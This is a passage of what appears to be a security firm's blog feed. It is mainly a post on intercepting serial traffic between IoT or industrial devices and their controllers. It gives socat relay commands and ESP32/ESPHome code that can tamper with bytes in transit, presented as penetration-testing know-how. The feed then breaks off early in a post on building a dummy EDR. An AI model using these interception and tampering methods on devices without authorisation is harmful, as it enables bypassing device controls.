the baud rate allowed it to work, albeit slower than a direct connection.</figcaption></figure>\n\n\n\n<p>One tool I did end up writing was a script to coalesce multiple consecutive <code>socat -x</code> reports within a specified timeframe into a single report, as well as changing the direction markers (&lt; &gt;) into a useful text description. This can make it easier to make sense of data reported by socat. That script can be found <a href=\"https://gist.github.com/RoganDawes/fa247297e38688fac5fecbfcf4f8e1f8\" data-type=\"link\" data-id=\"https://gist.github.com/RoganDawes/fa247297e38688fac5fecbfcf4f8e1f8\" target=\"_blank\" rel=\"noreferrer noopener\">here</a>.</p>\n\n\n\n<p>Alternative approaches I considered:</p>\n\n\n\n<ol>\n<li>Since this was actually serial over USB, I could use USBProxy to make my Linux device (which had a USB Device Controller) emulate the real USB dongle, and allow me to capture the data relayed between the two. This would be simpler, as it would not require the two USB Serial cables. This is the ultimate example of &#x201C;presenting a similar looking device&#x201D;, because it simply copies the target device&#x2019;s descriptors and presents those to the host. <br>This is an option, but I have not actually had the best of luck with USBProxy, and would have had to figure out how to decapsulate the serial data from the USB packets.</li>\n\n\n\n<li>Open up the dongle and try to tap the RX and TX pins after the FTDI USB-Serial chip.<br>Since the dongle was acting as an HSM (Hardware Security Module), I was concerned that opening it up might trigger tamper-detection measures, and wipe out the dongle. That would not have endeared me to the client!</li>\n</ol>\n\n\n\n<h2 class=\"wp-block-heading\">Scenario 2: Industrial device talking to its controller</h2>\n\n\n\n<p>In this specific scenario, I had a WiFi dongle connecting an electrical inverter to a cloud service. The dongle had a DE9 port through which it communicated with the inverter. This is strongly suggestive of an RS232 connection, as this has been a common connector for at least 30 years, along with the DE25, for talking to modems, etc.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/serial-pitm/image-6.png\"><img loading=\"lazy\" decoding=\"async\" width=\"433\" height=\"450\" src=\"https://sensepost.com/img/pages/blog/2024/serial-pitm/image-6.png\" alt=\"\" class=\"wp-image-72217\"></a><figcaption class=\"wp-element-caption\">DE9 pinout, including hardware flow control pins</figcaption></figure>\n\n\n\n<p>In order to expose the pins, I purchased two DE9 breakout boards, one with a female connector, and the other with a male connector. I then used some long header pins to connect them back to back, so that each signal was connected straight through. I also soldered some header pins to facilitate adding extra connections to the signals.</p>\n\n\n\n<figure class=\"wp-block-image size-large is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2024/serial-pitm/4C8498B4-B5CA-44FC-80DA-CB21393E4435_1_102_o.jpeg\"><img loading=\"lazy\" decoding=\"async\" width=\"1950\" height=\"1463\" src=\"https://sensepost.com/img/pages/blog/2024/serial-pitm/4C8498B4-B5CA-44FC-80DA-CB21393E4435_1_102_o-edited-1.jpeg\" alt=\"\" class=\"wp-image-72225\" style=\"width:609px;height:auto\"></a><figcaption class=\"wp-element-caption\">Back to back male and female DE9 breakout boards.</figcaption></figure>\n\n\n\n<p>Connecting this in between the inverter and the dongle, I used a multimeter to check whether this was indeed using the standard DE9 RS232 pinout. It was, with the additional detail that it was using the Ring Indicator pin (pin 9) to power the dongle at 12V. I thought this was quite a clever use of the pin, because the standard does not provide for power to be provided over the cable, but any compliant device connected to the port would be expected to handle 12V anyway. It turns out that this is a fairly common thing, with the serial ports on an industrial motherboard I looked at recently having the option to provide 12V or 5V on this pin.</p>\n\n\n\n<p>Keeping in mind that there are two transmit lines in operation (one in each direction), to capture the data sent between the dongle and the inverter, I would need two USB-RS232 cables in order to have two receive pins. Note that since the voltage levels are different to the TTL levels used by my USB-Serial cables in the previous scenario, and would destroy cables not designed for such voltages, I could not reuse those cables. To enable me to sniff the traffic between the two devices, I connected only the RX and ground pins of each USB-RS232 cable to the two data pins (pin 2 and 3), and the ground pin of the breakout boards.</p>\n\n\n\n<p>Note that RS232 and TTL Serial specifies Rx and Tx from the perspective of the closest device normally, so a pin on a microcontroller labelled TX would mean that the microcontroller would transmit on that pin, but the device connecting to it would receive those transmissions. i.e. connections are crossed over.</p>\n\n\n\n<p>In this case, I had two independent serial ports, /dev/ttyUSB0 and /dev/ttyUSB1 that did not need to be connected to each other as we did in the previous scenario, because the TX lines were not connected to anything. So, we can run two independent instances of socat to record the data from each one (in different terminals):</p>\n\n\n\n<pre class=\"wp-block-code\"><code>socat -x /dev/ttyUSB0,raw,echo=0,b9600 - &gt; /dev/null 2&gt;&amp;1 | tee serial0.log\nsocat -x /dev/ttyUSB1,raw,echo=0,b9600 - &gt; /dev/null 2&gt;&amp;1 | tee serial1.log</code></pre>\n\n\n\n<p>The problem with this is that it becomes difficult to view the data in context. i.e. one end sent X, and the other end responded with Y. Apart from anything else, socat records data read with the same directional notation, so merging the files means you can&#x2019;t tell which serial port read what. In order to solve that, we can actually use the same command line from the previous scenario, in order to record the timing and direction of the data as it was seen.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>socat -x /dev/ttyUSB0,raw,echo=0,b9600 /dev/ttyUSB1,raw,echo=0,b9600 2&gt;&amp;1 | tee serial.log</code></pre>\n\n\n\n<p>Data transmitted through a serial port that has no listener on the other end, simply disappears. There is no timeout, no full buffer, no confirmation of reception.</p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2024/serial-pitm/image-5.png\"><img loading=\"lazy\" decoding=\"async\" width=\"500\" height=\"390\" src=\"https://sensepost.com/img/pages/blog/2024/serial-pitm/image-5.png\" alt=\"\" class=\"wp-image-72216\" style=\"width:501px;height:auto\"></a><figcaption class=\"wp-element-caption\">If a serial port transmits, and there is nobody listening, did it even happen?</figcaption></figure>\n\n\n\n<p>This is a slightly different configuration of the listening serial cables, which has two major implications:</p>\n\n\n\n<ol>\n<li>Because the TX pins of the intercepting USB-Serial adapters are not connected, it is not actually a fully-featured Person in the Middle. Yes, you can snoop on the data going in each direction, but you cannot change it. The TX pin of each device is directly connected to the RX pin of the other device.<br>This should actually be more reliable than setting up the full Person in the Middle, as that introduces additional latency, while socat reads from one serial port, and writes to the other. For a protocol that is very latency sensitive, this might be enough to stop it working correctly.</li>\n\n\n\n<li>Additionally, the DE9 connection has extra pins, which may be used for handshaking (DSR, DTR, CTS, RTS), and the timings of those transitions when passed directly through might not match after the additional socat latency. Note: socat is unable to pass through handshaking signals at the same time as forwarding the data bytes.<br>Fortunately, hardware handshaking is less commonly used these days, as devices are generally fast enough to process data at most common baud rates, without having to tell the other end to stop sending.</li>\n</ol>\n\n\n\n<p>Can we turn this into a fully featured PitM? Yes, with a caveat. By disconnecting the header pins between the RX and TX pins, and connecting those in crossover form to the two USB-RS232 dongles, we can end up with a full PitM. As before, we can use the same socat command line as the first scenario to record the data.</p>\n\n\n\n<p>But what happens when we actually do want to tamper with the data? Well, one big hammer approach is to put <a href=\"https://github.com/sensepost/mallet\" data-type=\"link\" data-id=\"https://github.com/sensepost/mallet\" target=\"_blank\" rel=\"noreferrer noopener\">Mallet</a> to work:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>socat TCP-LISTEN:1234,reuseaddr /dev/ttyUSB0,raw,echo=0,b9600 &amp;\n\nsocat /dev/ttyUSB1,raw,echo=0,b9600 SOCKS:127.0.0.1:localhost:1234,socksport=1080 </code></pre>\n\n\n\n<p>This routes any data from USB1 via a SOCKS connection to where Mallet is listening (127.0.0.1:1080), and asks Mallet to connect to the socat instance on localhost:1234, which will relay the data to USB0, and vice versa. With that, you now have access to all the tools that Mallet offers.</p>\n\n\n\n<p>But that is quite a big hammer. Unfortunately, Mallet is not yet as easy to use as I would like. It may also be possible to do some modifications using tools such as netsed, or similar.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Building custom hardware</h2>\n\n\n\n<p>Another approach that &#x201C;does away&#x201D; with the computer in the middle is to shrink that computer dramatically, down to an ESP32. The ESP32 is a really powerful little microcontroller, that happens to have 3 serial ports available. Perfect for a task like this, with one left over for logging. Of course, we can also log over the network, since the ESP32 has WiFi. The nice thing about using a separate board is that it can be nice to be able to place them somewhere awkward to work (e.g. on the factory floor), and then access them remotely over the network. The ESP32 can even run Wireguard, for the ultimate in secure remote access.</p>\n\n\n\n<p>I spent some time making a custom board for the job, based on an SP3232 RS232 transceiver. This transceiver has two input channels, and two output channels, which lines up nicely with the two serial ports. I suspect that they were originally intended to manage a pair of hardware handshaking pins alongside the usual RX and TX, but they work perfectly in this role too.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/serial-pitm/image-8.png\"><img loading=\"lazy\" decoding=\"async\" width=\"609\" height=\"1024\" src=\"https://sensepost.com/img/pages/blog/2024/serial-pitm/image-8-609x1024.png\" alt=\"\" class=\"wp-image-72222\"></a><figcaption class=\"wp-element-caption\">Custom ESP32 carrier board with an RS232 transceiver, and headers with jumpers to adjust various connections</figcaption></figure>\n\n\n\n<p>The serial devices connect to the pins marked as connectors, on the bottom left and right of the board. The upper of the 3 connector pins is Ground, the middle pin is TX from the left to RX on the right, and the bottom pin is TX from the right to RX on the left. They don&#x2019;t strictly have to be connected that way, if all you are doing is snooping, as there is an RX pin connected to both &#x201C;rails&#x201D;, and you can see the traffic in either direction anyway. It can be a bit tricky to figure out which end the traffic reported comes from, though!</p>\n\n\n\n<p>It is also possible to swap RX and TX on either side, by changing the jumpers on the &#x201C;Crossover&#x201D; block on either side from horizontal to vertical.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/serial-pitm/image-9.png\"><img loading=\"lazy\" decoding=\"async\" width=\"635\" height=\"301\" src=\"https://sensepost.com/img/pages/blog/2024/serial-pitm/image-9.png\" alt=\"\" class=\"wp-image-72223\"></a><figcaption class=\"wp-element-caption\">Horizontal jumpers connect A to Rx and B to Tx, vertical jumpers connect A to Tx and B to Rx.</figcaption></figure>\n\n\n\n<p>To select between Snoop or PitM, change the jumpers on the PitM block from horizontal to vertical, connecting to the additional pin adjacent to the block of 4 on either side. This pin is the TX from each serial port on the ESP32, via the RS232 transceiver, and allows the ESP32 to transmit something other than what was received.</p>\n\n\n\n<p>The following is an extremely barebones Arduino example of how the ESP32 can copy or tamper data from one serial port to another:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>void setup() {\n  Serial1.begin(115200, SERIAL_8N1, RXD1, TXD1);\n  Serial2.begin(115200, SERIAL_8N1, RXD2, TXD2);\n}\n\nvoid loop() {\n  uint8_t c;\n  if (Serial1.available()) {\n    c = Serial1.read();\n    if (c == &apos;a&apos;) c = &apos;b&apos;;\n    Serial2.write(c);\n  }\n\n  if (Serial2.available()) {\n    c = Serial2.read();\n    Serial1.write(c);\n  }\n}</code></pre>\n\n\n\n<p>Of course, nobody wants to write code for a microcontroller from scratch. I have found the <a href=\"https://esphome.io\" target=\"_blank\" rel=\"noreferrer noopener\">ESPHome</a> project to be an excellent foundation for this sort of project, even if it is not really how it is intended to be used. It provides features such as WiFi connection management, Over The Air updates, logging over WiFi, Serial port buffering, and a whole lot more. The linked <a href=\"https://gist.github.com/RoganDawes/3c339644c1fcf80c2d598aa29838593a\" target=\"_blank\" rel=\"noreferrer noopener\">YAML file</a> results in a firmware which can be flashed to the ESP32, that includes all the above features. The below snippet shows the critical parts:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>uart:\n  - id: uart_bus1\n    rx_pin: GPIO25\n    tx_pin: GPIO26\n    baud_rate: 9600\n    debug:\n      direction: BOTH\n      dummy_receiver: false\n\n  - id: uart_bus2\n    rx_pin: GPIO14\n    tx_pin: GPIO27\n    baud_rate: 9600\n#    debug:\n#      direction: RX\n#      dummy_receiver: false\n\n#stream_server:\n#  - uart_id: uart_bus1\n#    port: 2001\n#\n#  - uart_id: uart_bus2\n#    port: 2002\n\nuart_mitm:\n  uart1: uart_bus1\n  uart2: uart_bus2</code></pre>\n\n\n\n<p>The main nodes of the above YAML are the <code>uart: </code>node and the <code>uart_mitm:</code> node. The <code>uart:</code> node defines the details of the serial ports, in particular, the baud rate that is to be used, and the <code>uart_mitm:</code> node links the two serial ports together. The other interesting part is the <code>debug:</code> node, which results in the data being sent in both directions being recorded to the ESPHome log. Again, this is better than recording only data read on both serial ports, because it is difficult to determine which port the data was read on!</p>\n\n\n\n<p>This is what the <code>uart_mitm:</code> code does:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>void UARTMITM::loop() {\n  uint8_t c;\n  while (this-&gt;uart1_-&gt;available()) {\n    this-&gt;uart1_-&gt;read_byte(&amp;c);\n    this-&gt;uart2_-&gt;write_byte(c);\n  }\n  while (this-&gt;uart2_-&gt;available()) {\n    this-&gt;uart2_-&gt;read_byte(&amp;c);\n    this-&gt;uart1_-&gt;write_byte(c);\n  }\n}</code></pre>\n\n\n\n<p>Essentially the same as the Arduino sketch above. If needed, the <code>uart_mitm:</code> component can be cloned locally, and modifications made to have it tamper with the traffic as needed. Of course, the new firmware would need to be uploaded to the ESP32 for it to take effect. This can be done Over The Air, for extra convenience.</p>\n\n\n\n<p>As an alternative to doing the tampering on the device, if the timing requirements of the protocol allow it, one can use the commented out <code>stream_server:</code> component instead of the <code>uart_mitm:</code> component. This connects each serial port to a TCP server listening on the specified port. This opens up the opportunity to use a tool such as Mallet again, as in the previous scenario:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>socat TCP:serial-pitm:2001 SOCKS:127.0.0.1:serial-pitm:2002,socksport=1080</code></pre>\n\n\n\n<p>For more examples of how to debug the uart component in ESPHome, check out the <a href=\"https://esphome.io/components/uart.html\" target=\"_blank\" rel=\"noreferrer noopener\">documentation</a>.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Conclusion</h2>\n\n\n\n<p>In this post I have shown you some approaches to obtaining serial communications from various devices, by operating in a Person in the Middle position. While the techniques shown are mostly useful in an &#x201C;observation-only&#x201D; manner, they can certainly be extended to a full tampering configuration.</p>\n\n\n\n<p>In many cases, though, just having an idea of what the conversation looks like will be enough to allow you to craft your own program to talk to the device in question, and start getting responses from it. Once you can do that, any controls implemented in the application can be bypassed. Have fun!</p>\n",
      "content:encodedSnippet": "Sometimes you need to get in the way of a hardware device and its controller, and see what it has to say for itself. If you are lucky, the two parts are communicating using a serial port, and then it’s relatively simple to do. In this post, I will explain two scenarios where I had to do this, and the approach that I took in each. As a bonus, I’ll also show some hardware that I put together to make it easier.\nScenario 1: IoT authorisation dongle\nIn this scenario, I was trying to connect to an IoT device. This particular device listened for a specific WiFi SSID beacon, then tried to connect with a calculated PSK. The calculation was performed on a PC, but required a connected dongle to provide part of the calculation. Unplugging the dongle from the controller PC, and plugging it into my own computer’s USB port, I could see that it enumerated as an FTDI serial device. Keeping in mind that I don’t control the controller PC, and I don’t control the dongle, what do?\nFortunately, I happened to have another FTDI USB Serial cable with me, that enumerated sufficiently similar to the dongle that the controller software was happy to talk to it. That gets me a third of the way there!\nThis is actually quite a valuable technique – present a device to the controller that looks sufficiently similar to what it is expecting that it will use it, but that we can see what it is doing. There are a couple of things to keep in mind, though. For some devices, you can update the VendorID:ProductID that is stored in EEPROM so that it matches the real device. e.g. using ftdi_eeprom on Linux. However, it will use the driver associated with that VID:PID to talk to it! So, you probably won’t be successful making a PL2303 serial device report itself as an FTDI serial device, because they use different drivers. In fact, I once managed to make an ATM bluescreen itself by making a Linux Serial Gadget report itself as an FTDI device! Nonetheless, since FTDI devices in particular have reprogrammable EEPROMs, it’s not unusual for device manufacturers to customise the VID:PID to make them uniquely identifiable, even if they still use the generic FTDI driver. You can then do the same using freely available tools, if you have a suitable substitute to hand.\nThe next step was seeing what the controller was saying to the serial cable. Fortunately, I had a second USB Serial cable with me, so I could get the data back into a PC (well, device running Linux, anyway!). I connected the TX of one cable to the RX of the other, and vice versa, and connected the two Ground pins together. Then I could use a serial terminal program like picocom to see what the controller was sending, and try to figure out the baud rate. Note that the second USB Serial cable didn’t have to be an FTDI specifically, since it was only the controller PC that cared what sort of device it was talking to.\nTwo FTDI USB-UART adapters configured in a crossover configuration.\n\n\n\nI ran the controller program a few times while looking at the serial terminal emulator, and changed the baud rate until what I saw seemed reasonable. Unsurprisingly, the correct baud rate turned out to be 115200, probably the most common rate for relatively modern devices. Older devices with low bandwidth requirements will often stick with 9600 baud. 2/3rds of the way there!\nOf course, seeing the initial conversation attempts with the controller application doesn’t really get you too far, without being able to respond with the data it is expecting. I plugged the dongle into my Linux PC as well, so I could relay the data that the controller was sending to the real dongle.\nsocat -x /dev/ttyUSB0,raw,echo=0,b115200 /dev/ttyUSB1,raw,echo=0,b115200 2>&1 | tee serial.log\nBreaking that down, socat is the swiss army knife of forwarders, and the -x option tells it to dump whatever it forwards in hex format. The two following arguments are the source and destination, in this case the device /dev/ttyUSB0 or ttyUSB1, doing no processing of the data (“raw”), and not echoing any data it receives to the original sender. (An echo can be useful for a cli, so the person typing can see what they have typed, but it is not useful for a machine that is not expecting it.) The hex dump output is then logged in serial.log where we can review it later, but also printed to the screen, so we can see that data is actually passing in both directions.\nWith that running, I queried the controller program to discover the PSK for the IoT device, and was able to capture the conversation with the dongle. From there, it becomes an exercise in reverse engineering the protocol, and trying to make sense of it. In this case, I was ultimately unsuccessful, as it was a binary protocol, I didn’t have a lot of time, and this wasn’t really a focus of my assessment anyway.\nExample output from intercepting Forscan talking to an ELM327 dongle using the same technique. This was done by relaying the socat connection over the Internet, because it’s possible, and also because I didn’t have the dongle with me. This is an instance where the fixed baud rate became a problem, because Forscan tries to upgrade the baud rate where possible, and socat can’t deal with that. Updating the Forscan config to not change the baud rate allowed it to work, albeit slower than a direct connection.\n\n\n\nOne tool I did end up writing was a script to coalesce multiple consecutive socat -x reports within a specified timeframe into a single report, as well as changing the direction markers (< >) into a useful text description. This can make it easier to make sense of data reported by socat. That script can be found here.\nAlternative approaches I considered:\nSince this was actually serial over USB, I could use USBProxy to make my Linux device (which had a USB Device Controller) emulate the real USB dongle, and allow me to capture the data relayed between the two. This would be simpler, as it would not require the two USB Serial cables. This is the ultimate example of “presenting a similar looking device”, because it simply copies the target device’s descriptors and presents those to the host. \nThis is an option, but I have not actually had the best of luck with USBProxy, and would have had to figure out how to decapsulate the serial data from the USB packets.\nOpen up the dongle and try to tap the RX and TX pins after the FTDI USB-Serial chip.\nSince the dongle was acting as an HSM (Hardware Security Module), I was concerned that opening it up might trigger tamper-detection measures, and wipe out the dongle. That would not have endeared me to the client!\nScenario 2: Industrial device talking to its controller\nIn this specific scenario, I had a WiFi dongle connecting an electrical inverter to a cloud service. The dongle had a DE9 port through which it communicated with the inverter. This is strongly suggestive of an RS232 connection, as this has been a common connector for at least 30 years, along with the DE25, for talking to modems, etc.\nDE9 pinout, including hardware flow control pins\n\n\n\nIn order to expose the pins, I purchased two DE9 breakout boards, one with a female connector, and the other with a male connector. I then used some long header pins to connect them back to back, so that each signal was connected straight through. I also soldered some header pins to facilitate adding extra connections to the signals.\nBack to back male and female DE9 breakout boards.\n\n\n\nConnecting this in between the inverter and the dongle, I used a multimeter to check whether this was indeed using the standard DE9 RS232 pinout. It was, with the additional detail that it was using the Ring Indicator pin (pin 9) to power the dongle at 12V. I thought this was quite a clever use of the pin, because the standard does not provide for power to be provided over the cable, but any compliant device connected to the port would be expected to handle 12V anyway. It turns out that this is a fairly common thing, with the serial ports on an industrial motherboard I looked at recently having the option to provide 12V or 5V on this pin.\nKeeping in mind that there are two transmit lines in operation (one in each direction), to capture the data sent between the dongle and the inverter, I would need two USB-RS232 cables in order to have two receive pins. Note that since the voltage levels are different to the TTL levels used by my USB-Serial cables in the previous scenario, and would destroy cables not designed for such voltages, I could not reuse those cables. To enable me to sniff the traffic between the two devices, I connected only the RX and ground pins of each USB-RS232 cable to the two data pins (pin 2 and 3), and the ground pin of the breakout boards.\nNote that RS232 and TTL Serial specifies Rx and Tx from the perspective of the closest device normally, so a pin on a microcontroller labelled TX would mean that the microcontroller would transmit on that pin, but the device connecting to it would receive those transmissions. i.e. connections are crossed over.\nIn this case, I had two independent serial ports, /dev/ttyUSB0 and /dev/ttyUSB1 that did not need to be connected to each other as we did in the previous scenario, because the TX lines were not connected to anything. So, we can run two independent instances of socat to record the data from each one (in different terminals):\nsocat -x /dev/ttyUSB0,raw,echo=0,b9600 - > /dev/null 2>&1 | tee serial0.log\nsocat -x /dev/ttyUSB1,raw,echo=0,b9600 - > /dev/null 2>&1 | tee serial1.log\nThe problem with this is that it becomes difficult to view the data in context. i.e. one end sent X, and the other end responded with Y. Apart from anything else, socat records data read with the same directional notation, so merging the files means you can’t tell which serial port read what. In order to solve that, we can actually use the same command line from the previous scenario, in order to record the timing and direction of the data as it was seen.\nsocat -x /dev/ttyUSB0,raw,echo=0,b9600 /dev/ttyUSB1,raw,echo=0,b9600 2>&1 | tee serial.log\nData transmitted through a serial port that has no listener on the other end, simply disappears. There is no timeout, no full buffer, no confirmation of reception.\nIf a serial port transmits, and there is nobody listening, did it even happen?\n\n\n\nThis is a slightly different configuration of the listening serial cables, which has two major implications:\nBecause the TX pins of the intercepting USB-Serial adapters are not connected, it is not actually a fully-featured Person in the Middle. Yes, you can snoop on the data going in each direction, but you cannot change it. The TX pin of each device is directly connected to the RX pin of the other device.\nThis should actually be more reliable than setting up the full Person in the Middle, as that introduces additional latency, while socat reads from one serial port, and writes to the other. For a protocol that is very latency sensitive, this might be enough to stop it working correctly.\nAdditionally, the DE9 connection has extra pins, which may be used for handshaking (DSR, DTR, CTS, RTS), and the timings of those transitions when passed directly through might not match after the additional socat latency. Note: socat is unable to pass through handshaking signals at the same time as forwarding the data bytes.\nFortunately, hardware handshaking is less commonly used these days, as devices are generally fast enough to process data at most common baud rates, without having to tell the other end to stop sending.\nCan we turn this into a fully featured PitM? Yes, with a caveat. By disconnecting the header pins between the RX and TX pins, and connecting those in crossover form to the two USB-RS232 dongles, we can end up with a full PitM. As before, we can use the same socat command line as the first scenario to record the data.\nBut what happens when we actually do want to tamper with the data? Well, one big hammer approach is to put Mallet to work:\nsocat TCP-LISTEN:1234,reuseaddr /dev/ttyUSB0,raw,echo=0,b9600 &\n\nsocat /dev/ttyUSB1,raw,echo=0,b9600 SOCKS:127.0.0.1:localhost:1234,socksport=1080 \nThis routes any data from USB1 via a SOCKS connection to where Mallet is listening (127.0.0.1:1080), and asks Mallet to connect to the socat instance on localhost:1234, which will relay the data to USB0, and vice versa. With that, you now have access to all the tools that Mallet offers.\nBut that is quite a big hammer. Unfortunately, Mallet is not yet as easy to use as I would like. It may also be possible to do some modifications using tools such as netsed, or similar.\nBuilding custom hardware\nAnother approach that “does away” with the computer in the middle is to shrink that computer dramatically, down to an ESP32. The ESP32 is a really powerful little microcontroller, that happens to have 3 serial ports available. Perfect for a task like this, with one left over for logging. Of course, we can also log over the network, since the ESP32 has WiFi. The nice thing about using a separate board is that it can be nice to be able to place them somewhere awkward to work (e.g. on the factory floor), and then access them remotely over the network. The ESP32 can even run Wireguard, for the ultimate in secure remote access.\nI spent some time making a custom board for the job, based on an SP3232 RS232 transceiver. This transceiver has two input channels, and two output channels, which lines up nicely with the two serial ports. I suspect that they were originally intended to manage a pair of hardware handshaking pins alongside the usual RX and TX, but they work perfectly in this role too.\nCustom ESP32 carrier board with an RS232 transceiver, and headers with jumpers to adjust various connections\n\n\n\nThe serial devices connect to the pins marked as connectors, on the bottom left and right of the board. The upper of the 3 connector pins is Ground, the middle pin is TX from the left to RX on the right, and the bottom pin is TX from the right to RX on the left. They don’t strictly have to be connected that way, if all you are doing is snooping, as there is an RX pin connected to both “rails”, and you can see the traffic in either direction anyway. It can be a bit tricky to figure out which end the traffic reported comes from, though!\nIt is also possible to swap RX and TX on either side, by changing the jumpers on the “Crossover” block on either side from horizontal to vertical.\nHorizontal jumpers connect A to Rx and B to Tx, vertical jumpers connect A to Tx and B to Rx.\n\n\n\nTo select between Snoop or PitM, change the jumpers on the PitM block from horizontal to vertical, connecting to the additional pin adjacent to the block of 4 on either side. This pin is the TX from each serial port on the ESP32, via the RS232 transceiver, and allows the ESP32 to transmit something other than what was received.\nThe following is an extremely barebones Arduino example of how the ESP32 can copy or tamper data from one serial port to another:\nvoid setup() {\n  Serial1.begin(115200, SERIAL_8N1, RXD1, TXD1);\n  Serial2.begin(115200, SERIAL_8N1, RXD2, TXD2);\n}\n\nvoid loop() {\n  uint8_t c;\n  if (Serial1.available()) {\n    c = Serial1.read();\n    if (c == 'a') c = 'b';\n    Serial2.write(c);\n  }\n\n  if (Serial2.available()) {\n    c = Serial2.read();\n    Serial1.write(c);\n  }\n}\nOf course, nobody wants to write code for a microcontroller from scratch. I have found the ESPHome project to be an excellent foundation for this sort of project, even if it is not really how it is intended to be used. It provides features such as WiFi connection management, Over The Air updates, logging over WiFi, Serial port buffering, and a whole lot more. The linked YAML file results in a firmware which can be flashed to the ESP32, that includes all the above features. The below snippet shows the critical parts:\nuart:\n  - id: uart_bus1\n    rx_pin: GPIO25\n    tx_pin: GPIO26\n    baud_rate: 9600\n    debug:\n      direction: BOTH\n      dummy_receiver: false\n\n  - id: uart_bus2\n    rx_pin: GPIO14\n    tx_pin: GPIO27\n    baud_rate: 9600\n#    debug:\n#      direction: RX\n#      dummy_receiver: false\n\n#stream_server:\n#  - uart_id: uart_bus1\n#    port: 2001\n#\n#  - uart_id: uart_bus2\n#    port: 2002\n\nuart_mitm:\n  uart1: uart_bus1\n  uart2: uart_bus2\nThe main nodes of the above YAML are the uart: node and the uart_mitm: node. The uart: node defines the details of the serial ports, in particular, the baud rate that is to be used, and the uart_mitm: node links the two serial ports together. The other interesting part is the debug: node, which results in the data being sent in both directions being recorded to the ESPHome log. Again, this is better than recording only data read on both serial ports, because it is difficult to determine which port the data was read on!\nThis is what the uart_mitm: code does:\nvoid UARTMITM::loop() {\n  uint8_t c;\n  while (this->uart1_->available()) {\n    this->uart1_->read_byte(&c);\n    this->uart2_->write_byte(c);\n  }\n  while (this->uart2_->available()) {\n    this->uart2_->read_byte(&c);\n    this->uart1_->write_byte(c);\n  }\n}\nEssentially the same as the Arduino sketch above. If needed, the uart_mitm: component can be cloned locally, and modifications made to have it tamper with the traffic as needed. Of course, the new firmware would need to be uploaded to the ESP32 for it to take effect. This can be done Over The Air, for extra convenience.\nAs an alternative to doing the tampering on the device, if the timing requirements of the protocol allow it, one can use the commented out stream_server: component instead of the uart_mitm: component. This connects each serial port to a TCP server listening on the specified port. This opens up the opportunity to use a tool such as Mallet again, as in the previous scenario:\nsocat TCP:serial-pitm:2001 SOCKS:127.0.0.1:serial-pitm:2002,socksport=1080\nFor more examples of how to debug the uart component in ESPHome, check out the documentation.\nConclusion\nIn this post I have shown you some approaches to obtaining serial communications from various devices, by operating in a Person in the Middle position. While the techniques shown are mostly useful in an “observation-only” manner, they can certainly be extended to a full tampering configuration.\nIn many cases, though, just having an idea of what the conversation looks like will be enough to allow you to craft your own program to talk to the device in question, and start getting responses from it. Once you can do that, any controls implemented in the application can be bypassed. Have fun!",
      "content": "Sometimes you need to get in the way of a hardware device and its controller, and see what it has to say for itself. If you are lucky, the two parts are communicating using a serial port, and then it&amp;#x2019;s relatively simple to do. In this post, I will explain two scenarios where I had to do this, and the approach that I took in each. As a bonus, I&amp;#x2019;ll also show some hardware that I put together to make it easier.\n\n",
      "contentSnippet": "Sometimes you need to get in the way of a hardware device and its controller, and see what it has to say for itself. If you are lucky, the two parts are communicating using a serial port, and then it&#x2019;s relatively simple to do. In this post, I will explain two scenarios where I had to do this, and the approach that I took in each. As a bonus, I&#x2019;ll also show some hardware that I put together to make it easier.",
      "guid": "https://sensepost.com/blog/2024/serial-pitm/",
      "isoDate": "2024-02-06T15:04:48.000Z",
      "itunes": {}
    },
    {
      "title": "Sensecon 23: from Windows drivers to an almost fully working EDR",
      "link": "https://sensepost.com/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/",
      "pubDate": "Wed, 31 Jan 2024 08:33:14 +0000",
      "content:encoded": "<p>TL;DR I wanted to better understand EDR&#x2019;s so I built a <a href=\"https://github.com/sensepost/mydumbedr\">dummy EDR</a> and talk about it here. </p>\n\n\n\n<p>EDR (<strong>E</strong>ndpoint <strong>D</strong>etection and <strong>R</strong>esponse) is a kind of security product that aims to detect abnormal activities being executed on a computer or a server.</p>\n\n\n\n<p>When looking for resources about how EDR&#x2019;s work, I realised that, even if there is a lot of literature available about EDR&#x2019;s, there aren&#x2019;t many articles explaining how an EDR&#x2019;s is architected and how the different components of a EDR are orchestrated. This article aims to demystify how EDR&#x2019;s work while building a custom one that will implement a few techniques used by real EDR&#x2019;s.</p>\n\n\n\n<p>First we will take a look at the history of anti-viruses, see how they worked and why they relied on a kernel driver, then we will see how to create a custom kernel driver and finally how to turn it into a almost fully working EDR.</p>\n\n\n\n<h2 class=\"wp-block-heading\">I/ Virus history</h2>\n\n\n\n<p>If we take a look at the <a href=\"https://en.wikipedia.org/wiki/Timeline_of_computer_viruses_and_worms\">timeline of computer viruses and worms</a> we&#x2019;ll learn that that the term &#x201C;worm&#x201D; was originally used by John von Neumann in an article called &#x201C;Theory of self-reproducing automata&#x201D; published in 1966. In this article, Neumann showed that, in theory, a program could be designed so that it is able to reproduce itself. For this work, Neumann was considered to be the theoretical &#x201C;father&#x201D; of computer virology.</p>\n\n\n\n<p>The first ever working virus was called &#x201C;The Creeper&#x201D; and was created by Bob Thomas. This was the first known worm as it was able to replicate over the network (ARPANET) copying itself to remote systems. Although it is the first detected virus ever, its actions were benign since it only printed the message &#x201C;I&#x2019;M THE CREEPER. CATCH ME IF YOU CAN&#x201D;:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/creeper_virus.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1006\" height=\"228\" 